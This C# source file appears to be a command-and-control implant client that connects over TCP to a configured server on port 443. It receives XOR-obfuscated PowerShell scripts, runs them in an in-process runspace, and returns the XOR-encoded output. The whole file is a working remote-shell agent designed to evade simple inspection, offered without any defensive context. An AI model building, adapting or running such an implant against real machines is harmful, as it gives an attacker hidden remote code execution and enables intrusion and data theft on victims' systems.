using System;
using System.Collections.ObjectModel;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net.Sockets;
using System.Text;

namespace RFC_PwshRunspaceTCPC2_Client
{
    public class Program
    {
        public static void Main(string[] args)
        {
            #region config
            string server = "localhost";
            int port = 443;
            #endregion

            #region connect
            TcpClient tcpClient = new TcpClient(server, port);
            #endregion

            #region stream
            NetworkStream networkStream = tcpClient.GetStream();
            #endregion

            #region create runspaces
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            PowerShell powershell = PowerShell.Create();
            powershell.Runspace = runspace;
            #endregion

            bool debug = true;

            while (true)
            {
                if (debug)
                {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine($"\n==============================================");
                    Console.ResetColor();
                }

                #region receive
                // read the size of the data from server
                byte[] dataSizeBytes = new byte[sizeof(int)];
                networkStream.Read(dataSizeBytes, 0, dataSizeBytes.Length);
                int dataSize = BitConverter.ToInt32(dataSizeBytes, 0);

                if (debug)
                {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine($"\n[debug] Received data size: {dataSize}");
                    Console.ResetColor();
                }

                // create a buffer to hold the received data
                int totalBytesRead = 0;
                byte[] buffer = new byte[dataSize];
                while (totalBytesRead < dataSize)
                {
                    int bytesRead = networkStream.Read(buffer, totalBytesRead, buffer.Length - totalBytesRead);
                    totalBytesRead += bytesRead;
                }

                // decrypting the received data
                byte[] decryptedBytes = new byte[buffer.Length];
                for (int i = 0; i < buffer.Length; i++)
                {
                    decryptedBytes[i] = (byte)(buffer[i] ^ 0xFF);
                }

                // converting the decrypted bytes to string
                string receivedData = Encoding.UTF8.GetString(decryptedBytes, 0, decryptedBytes.Length);

                if (debug)
                {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine($"[debug] Received data: \n{receivedData}");
                    Console.ResetColor();
                }
                #endregion

                #region process and output
                StringWriter stringwriter = new StringWriter();
                string sendData = "";
                powershell.Commands.Clear();
                powershell.Streams.ClearStreams();
                powershell.AddScript(receivedData);
                powershell.AddCommand("Out-String");
                Collection<PSObject> results = new Collection<PSObject>();
                try
                {
                    results = powershell.Invoke();
                    foreach (PSObject obj in results)
                    {
                        stringwriter.WriteLine(obj);
                    }

                    foreach (ErrorRecord error in powershell.Streams.Error)
                    {
                        stringwriter.WriteLine(error.ToString());
                    }

                    sendData = stringwriter.ToString();
                }
                catch (RuntimeException ex)
                {
                    stringwriter.WriteLine(ex.ErrorRecord.ToString());
                    sendData = stringwriter.ToString();
                }
                #endregion

                #region send
                // Send the size of the data to the server
                byte[] dataSizeBytesSend = BitConverter.GetBytes(sendData.Length);
                networkStream.Write(dataSizeBytesSend, 0, dataSizeBytesSend.Length);
                networkStream.Flush();

                if (debug)
                {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine($"\n[debug] Sending data size: {sendData.Length}");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine($"[debug] Sending data: \n{sendData}");
                    Console.ResetColor();
                }

                // encrypting the data to send
                byte[] encryptedBytes = Encoding.UTF8.GetBytes(sendData);
                for (int i = 0; i < encryptedBytes.Length; i++)
                {
                    encryptedBytes[i] = (byte)(encryptedBytes[i] ^ 0xFF);
                }

                // Send the data to the server
                networkStream.Write(encryptedBytes, 0, encryptedBytes.Length);
                networkStream.Flush();
                #endregion
            }
        }
    }
}
